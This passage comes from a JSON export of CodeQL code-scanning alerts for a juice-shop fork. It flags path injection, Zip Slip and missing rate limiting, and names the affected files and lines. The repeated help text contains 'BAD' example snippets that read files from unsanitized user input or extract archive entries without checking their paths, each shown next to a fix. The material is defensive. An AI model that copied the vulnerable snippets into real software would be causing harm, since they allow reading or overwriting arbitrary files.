[CWE-99](https://cwe.mitre.org/data/definitions/99.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This path depends on a user-provided value."},"location":{"path":"routes/profileImageUrlUpload.ts","start_line":31,"end_line":31,"start_column":54,"end_column":138},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/57/instances","dismissal_approved_by":null},{"number":56,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/56","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/56","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/path-injection","severity":"error","description":"Uncontrolled data used in path expression","name":"js/path-injection","tags":["external/cwe/cwe-022","external/cwe/cwe-023","external/cwe/cwe-036","external/cwe/cwe-073","external/cwe/cwe-099","security"],"full_description":"Accessing paths influenced by users can allow an attacker to access unexpected resources.","help":"# Uncontrolled data used in path expression\nAccessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\n\n## Recommendation\nValidate user input before using it to construct a file path.\n\nThe validation method you should use depends on whether you want to allow the user to specify complex paths with multiple components that may span multiple folders, or only simple filenames without a path component.\n\nIn the former case, a common strategy is to make sure that the constructed file path is contained within a safe root folder. First, normalize the path using `path.resolve` or `fs.realpathSync` to remove any \"..\" segments. You should always normalize the file path since an unnormalized path that starts with the root folder can still be used to access files outside the root folder. Then, after you have normalized the path, check that the path starts with the root folder.\n\nIn the latter case, you can use a library like the `sanitize-filename` npm package to eliminate any special characters from the file path. Note that it is *not* sufficient to only remove \"../\" sequences: for example, applying this filter to \".../...//\" would still result in the string \"../\".\n\nFinally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.\n\n\n## Example\nIn the first (bad) example, the code reads the file name from an HTTP request, then accesses that file within a root folder. A malicious user could enter a file name containing \"../\" segments to navigate outside the root folder and access sensitive files.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // BAD: This function uses unsanitized input that can read any file on the file system.\n  res.write(fs.readFileSync(ROOT + filePath, 'utf8'));\n});\n```\nThe second (good) example shows how to avoid access to sensitive files by sanitizing the file path. First, the code resolves the file name relative to a root folder, normalizing the path and removing any \"../\" segments in the process. Then, the code calls `fs.realpathSync` to resolve any symbolic links in the path. Finally, the code checks that the normalized path starts with the path of the root folder, ensuring the file is contained within the root folder.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      path = require('path'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // GOOD: Verify that the file path is under the root directory\n  filePath = fs.realpathSync(path.resolve(ROOT, filePath));\n  if (!filePath.startsWith(ROOT)) {\n    res.statusCode = 403;\n    res.end();\n    return;\n  }\n  res.write(fs.readFileSync(filePath, 'utf8'));\n});\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* npm: [sanitize-filename](https://www.npmjs.com/package/sanitize-filename) package.\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This path depends on a user-provided value."},"location":{"path":"routes/quarantineServer.ts","start_line":14,"end_line":14,"start_column":20,"end_column":57},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/56/instances","dismissal_approved_by":null},{"number":55,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/55","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/55","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/path-injection","severity":"error","description":"Uncontrolled data used in path expression","name":"js/path-injection","tags":["external/cwe/cwe-022","external/cwe/cwe-023","external/cwe/cwe-036","external/cwe/cwe-073","external/cwe/cwe-099","security"],"full_description":"Accessing paths influenced by users can allow an attacker to access unexpected resources.","help":"# Uncontrolled data used in path expression\nAccessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\n\n## Recommendation\nValidate user input before using it to construct a file path.\n\nThe validation method you should use depends on whether you want to allow the user to specify complex paths with multiple components that may span multiple folders, or only simple filenames without a path component.\n\nIn the former case, a common strategy is to make sure that the constructed file path is contained within a safe root folder. First, normalize the path using `path.resolve` or `fs.realpathSync` to remove any \"..\" segments. You should always normalize the file path since an unnormalized path that starts with the root folder can still be used to access files outside the root folder. Then, after you have normalized the path, check that the path starts with the root folder.\n\nIn the latter case, you can use a library like the `sanitize-filename` npm package to eliminate any special characters from the file path. Note that it is *not* sufficient to only remove \"../\" sequences: for example, applying this filter to \".../...//\" would still result in the string \"../\".\n\nFinally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.\n\n\n## Example\nIn the first (bad) example, the code reads the file name from an HTTP request, then accesses that file within a root folder. A malicious user could enter a file name containing \"../\" segments to navigate outside the root folder and access sensitive files.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // BAD: This function uses unsanitized input that can read any file on the file system.\n  res.write(fs.readFileSync(ROOT + filePath, 'utf8'));\n});\n```\nThe second (good) example shows how to avoid access to sensitive files by sanitizing the file path. First, the code resolves the file name relative to a root folder, normalizing the path and removing any \"../\" segments in the process. Then, the code calls `fs.realpathSync` to resolve any symbolic links in the path. Finally, the code checks that the normalized path starts with the path of the root folder, ensuring the file is contained within the root folder.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      path = require('path'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // GOOD: Verify that the file path is under the root directory\n  filePath = fs.realpathSync(path.resolve(ROOT, filePath));\n  if (!filePath.startsWith(ROOT)) {\n    res.statusCode = 403;\n    res.end();\n    return;\n  }\n  res.write(fs.readFileSync(filePath, 'utf8'));\n});\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* npm: [sanitize-filename](https://www.npmjs.com/package/sanitize-filename) package.\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This path depends on a user-provided value."},"location":{"path":"routes/logfileServer.ts","start_line":14,"end_line":14,"start_column":20,"end_column":47},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/55/instances","dismissal_approved_by":null},{"number":54,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/54","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/54","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/path-injection","severity":"error","description":"Uncontrolled data used in path expression","name":"js/path-injection","tags":["external/cwe/cwe-022","external/cwe/cwe-023","external/cwe/cwe-036","external/cwe/cwe-073","external/cwe/cwe-099","security"],"full_description":"Accessing paths influenced by users can allow an attacker to access unexpected resources.","help":"# Uncontrolled data used in path expression\nAccessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\n\n## Recommendation\nValidate user input before using it to construct a file path.\n\nThe validation method you should use depends on whether you want to allow the user to specify complex paths with multiple components that may span multiple folders, or only simple filenames without a path component.\n\nIn the former case, a common strategy is to make sure that the constructed file path is contained within a safe root folder. First, normalize the path using `path.resolve` or `fs.realpathSync` to remove any \"..\" segments. You should always normalize the file path since an unnormalized path that starts with the root folder can still be used to access files outside the root folder. Then, after you have normalized the path, check that the path starts with the root folder.\n\nIn the latter case, you can use a library like the `sanitize-filename` npm package to eliminate any special characters from the file path. Note that it is *not* sufficient to only remove \"../\" sequences: for example, applying this filter to \".../...//\" would still result in the string \"../\".\n\nFinally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.\n\n\n## Example\nIn the first (bad) example, the code reads the file name from an HTTP request, then accesses that file within a root folder. A malicious user could enter a file name containing \"../\" segments to navigate outside the root folder and access sensitive files.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // BAD: This function uses unsanitized input that can read any file on the file system.\n  res.write(fs.readFileSync(ROOT + filePath, 'utf8'));\n});\n```\nThe second (good) example shows how to avoid access to sensitive files by sanitizing the file path. First, the code resolves the file name relative to a root folder, normalizing the path and removing any \"../\" segments in the process. Then, the code calls `fs.realpathSync` to resolve any symbolic links in the path. Finally, the code checks that the normalized path starts with the path of the root folder, ensuring the file is contained within the root folder.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      path = require('path'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // GOOD: Verify that the file path is under the root directory\n  filePath = fs.realpathSync(path.resolve(ROOT, filePath));\n  if (!filePath.startsWith(ROOT)) {\n    res.statusCode = 403;\n    res.end();\n    return;\n  }\n  res.write(fs.readFileSync(filePath, 'utf8'));\n});\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* npm: [sanitize-filename](https://www.npmjs.com/package/sanitize-filename) package.\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This path depends on a user-provided value."},"location":{"path":"routes/keyServer.ts","start_line":14,"end_line":14,"start_column":20,"end_column":57},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/54/instances","dismissal_approved_by":null},{"number":53,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/53","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/53","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/path-injection","severity":"error","description":"Uncontrolled data used in path expression","name":"js/path-injection","tags":["external/cwe/cwe-022","external/cwe/cwe-023","external/cwe/cwe-036","external/cwe/cwe-073","external/cwe/cwe-099","security"],"full_description":"Accessing paths influenced by users can allow an attacker to access unexpected resources.","help":"# Uncontrolled data used in path expression\nAccessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\n\n## Recommendation\nValidate user input before using it to construct a file path.\n\nThe validation method you should use depends on whether you want to allow the user to specify complex paths with multiple components that may span multiple folders, or only simple filenames without a path component.\n\nIn the former case, a common strategy is to make sure that the constructed file path is contained within a safe root folder. First, normalize the path using `path.resolve` or `fs.realpathSync` to remove any \"..\" segments. You should always normalize the file path since an unnormalized path that starts with the root folder can still be used to access files outside the root folder. Then, after you have normalized the path, check that the path starts with the root folder.\n\nIn the latter case, you can use a library like the `sanitize-filename` npm package to eliminate any special characters from the file path. Note that it is *not* sufficient to only remove \"../\" sequences: for example, applying this filter to \".../...//\" would still result in the string \"../\".\n\nFinally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.\n\n\n## Example\nIn the first (bad) example, the code reads the file name from an HTTP request, then accesses that file within a root folder. A malicious user could enter a file name containing \"../\" segments to navigate outside the root folder and access sensitive files.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // BAD: This function uses unsanitized input that can read any file on the file system.\n  res.write(fs.readFileSync(ROOT + filePath, 'utf8'));\n});\n```\nThe second (good) example shows how to avoid access to sensitive files by sanitizing the file path. First, the code resolves the file name relative to a root folder, normalizing the path and removing any \"../\" segments in the process. Then, the code calls `fs.realpathSync` to resolve any symbolic links in the path. Finally, the code checks that the normalized path starts with the path of the root folder, ensuring the file is contained within the root folder.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      path = require('path'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // GOOD: Verify that the file path is under the root directory\n  filePath = fs.realpathSync(path.resolve(ROOT, filePath));\n  if (!filePath.startsWith(ROOT)) {\n    res.statusCode = 403;\n    res.end();\n    return;\n  }\n  res.write(fs.readFileSync(filePath, 'utf8'));\n});\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* npm: [sanitize-filename](https://www.npmjs.com/package/sanitize-filename) package.\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This path depends on a user-provided value."},"location":{"path":"routes/fileUpload.ts","start_line":35,"end_line":35,"start_column":33,"end_column":41},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/53/instances","dismissal_approved_by":null},{"number":52,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/52","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/52","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/path-injection","severity":"error","description":"Uncontrolled data used in path expression","name":"js/path-injection","tags":["external/cwe/cwe-022","external/cwe/cwe-023","external/cwe/cwe-036","external/cwe/cwe-073","external/cwe/cwe-099","security"],"full_description":"Accessing paths influenced by users can allow an attacker to access unexpected resources.","help":"# Uncontrolled data used in path expression\nAccessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\n\n## Recommendation\nValidate user input before using it to construct a file path.\n\nThe validation method you should use depends on whether you want to allow the user to specify complex paths with multiple components that may span multiple folders, or only simple filenames without a path component.\n\nIn the former case, a common strategy is to make sure that the constructed file path is contained within a safe root folder. First, normalize the path using `path.resolve` or `fs.realpathSync` to remove any \"..\" segments. You should always normalize the file path since an unnormalized path that starts with the root folder can still be used to access files outside the root folder. Then, after you have normalized the path, check that the path starts with the root folder.\n\nIn the latter case, you can use a library like the `sanitize-filename` npm package to eliminate any special characters from the file path. Note that it is *not* sufficient to only remove \"../\" sequences: for example, applying this filter to \".../...//\" would still result in the string \"../\".\n\nFinally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.\n\n\n## Example\nIn the first (bad) example, the code reads the file name from an HTTP request, then accesses that file within a root folder. A malicious user could enter a file name containing \"../\" segments to navigate outside the root folder and access sensitive files.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // BAD: This function uses unsanitized input that can read any file on the file system.\n  res.write(fs.readFileSync(ROOT + filePath, 'utf8'));\n});\n```\nThe second (good) example shows how to avoid access to sensitive files by sanitizing the file path. First, the code resolves the file name relative to a root folder, normalizing the path and removing any \"../\" segments in the process. Then, the code calls `fs.realpathSync` to resolve any symbolic links in the path. Finally, the code checks that the normalized path starts with the path of the root folder, ensuring the file is contained within the root folder.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      path = require('path'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // GOOD: Verify that the file path is under the root directory\n  filePath = fs.realpathSync(path.resolve(ROOT, filePath));\n  if (!filePath.startsWith(ROOT)) {\n    res.statusCode = 403;\n    res.end();\n    return;\n  }\n  res.write(fs.readFileSync(filePath, 'utf8'));\n});\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* npm: [sanitize-filename](https://www.npmjs.com/package/sanitize-filename) package.\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This path depends on a user-provided value."},"location":{"path":"routes/fileUpload.ts","start_line":30,"end_line":30,"start_column":15,"end_column":23},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/52/instances","dismissal_approved_by":null},{"number":51,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/51","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/51","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/path-injection","severity":"error","description":"Uncontrolled data used in path expression","name":"js/path-injection","tags":["external/cwe/cwe-022","external/cwe/cwe-023","external/cwe/cwe-036","external/cwe/cwe-073","external/cwe/cwe-099","security"],"full_description":"Accessing paths influenced by users can allow an attacker to access unexpected resources.","help":"# Uncontrolled data used in path expression\nAccessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\n\n## Recommendation\nValidate user input before using it to construct a file path.\n\nThe validation method you should use depends on whether you want to allow the user to specify complex paths with multiple components that may span multiple folders, or only simple filenames without a path component.\n\nIn the former case, a common strategy is to make sure that the constructed file path is contained within a safe root folder. First, normalize the path using `path.resolve` or `fs.realpathSync` to remove any \"..\" segments. You should always normalize the file path since an unnormalized path that starts with the root folder can still be used to access files outside the root folder. Then, after you have normalized the path, check that the path starts with the root folder.\n\nIn the latter case, you can use a library like the `sanitize-filename` npm package to eliminate any special characters from the file path. Note that it is *not* sufficient to only remove \"../\" sequences: for example, applying this filter to \".../...//\" would still result in the string \"../\".\n\nFinally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.\n\n\n## Example\nIn the first (bad) example, the code reads the file name from an HTTP request, then accesses that file within a root folder. A malicious user could enter a file name containing \"../\" segments to navigate outside the root folder and access sensitive files.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // BAD: This function uses unsanitized input that can read any file on the file system.\n  res.write(fs.readFileSync(ROOT + filePath, 'utf8'));\n});\n```\nThe second (good) example shows how to avoid access to sensitive files by sanitizing the file path. First, the code resolves the file name relative to a root folder, normalizing the path and removing any \"../\" segments in the process. Then, the code calls `fs.realpathSync` to resolve any symbolic links in the path. Finally, the code checks that the normalized path starts with the path of the root folder, ensuring the file is contained within the root folder.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      path = require('path'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // GOOD: Verify that the file path is under the root directory\n  filePath = fs.realpathSync(path.resolve(ROOT, filePath));\n  if (!filePath.startsWith(ROOT)) {\n    res.statusCode = 403;\n    res.end();\n    return;\n  }\n  res.write(fs.readFileSync(filePath, 'utf8'));\n});\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* npm: [sanitize-filename](https://www.npmjs.com/package/sanitize-filename) package.\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This path depends on a user-provided value."},"location":{"path":"routes/fileServer.ts","start_line":33,"end_line":33,"start_column":20,"end_column":46},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/51/instances","dismissal_approved_by":null},{"number":50,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/50","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/50","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/zipslip","severity":"error","description":"Arbitrary file access during archive extraction (\"Zip Slip\")","name":"js/zipslip","tags":["external/cwe/cwe-022","security"],"full_description":"Extracting files from a malicious ZIP file, or similar type of archive, without validating that the destination file path is within the destination directory can allow an attacker to unexpectedly gain access to resources.","help":"# Arbitrary file access during archive extraction (\"Zip Slip\")\nExtracting files from a malicious zip file, or similar type of archive, is at risk of directory traversal attacks if filenames from the archive are not properly validated. archive paths.\n\nZip archives contain archive entries representing each file in the archive. These entries include a file path for the entry, but these file paths are not restricted and may contain unexpected special elements such as the directory traversal element (`..`). If these file paths are used to create a filesystem path, then a file operation may happen in an unexpected location. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\nFor example, if a zip file contains a file entry `..\\sneaky-file`, and the zip file is extracted to the directory `c:\\output`, then naively combining the paths would result in an output file path of `c:\\output\\..\\sneaky-file`, which would cause the file to be written to `c:\\sneaky-file`.\n\n\n## Recommendation\nEnsure that output paths constructed from zip archive entries are validated to prevent writing files to unexpected locations.\n\nThe recommended way of writing an output file from a zip archive entry is to check that `\"..\"` does not occur in the path.\n\n\n## Example\nIn this example an archive is extracted without validating file paths. If `archive.zip` contained relative paths (for instance, if it were created by something like `zip archive.zip ../file.txt`) then executing this code could write to locations outside the destination directory.\n\n\n```javascript\nconst fs = require('fs');\nconst unzip = require('unzip');\n\nfs.createReadStream('archive.zip')\n  .pipe(unzip.Parse())\n  .on('entry', entry => {\n    const fileName = entry.path;\n    // BAD: This could write any file on the filesystem.\n    entry.pipe(fs.createWriteStream(fileName));\n  });\n\n```\nTo fix this vulnerability, we need to check that the path does not contain any `\"..\"` elements in it.\n\n\n```javascript\nconst fs = require('fs');\nconst unzip = require('unzip');\n\nfs.createReadStream('archive.zip')\n  .pipe(unzip.Parse())\n  .on('entry', entry => {\n    const fileName = entry.path;\n    // GOOD: ensures the path is safe to write to.\n    if (fileName.indexOf('..') == -1) {\n      entry.pipe(fs.createWriteStream(fileName));\n    }\n    else {\n      console.log('skipping bad path', fileName);\n    }\n  });\n\n```\n\n## References\n* Snyk: [Zip Slip Vulnerability](https://snyk.io/research/zip-slip-vulnerability).\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Unsanitized archive entry, which may contain '..', is used in a file system operation."},"location":{"path":"routes/fileUpload.ts","start_line":38,"end_line":38,"start_column":34,"end_column":44},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/50/instances","dismissal_approved_by":null},{"number":49,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/49","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/49","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) 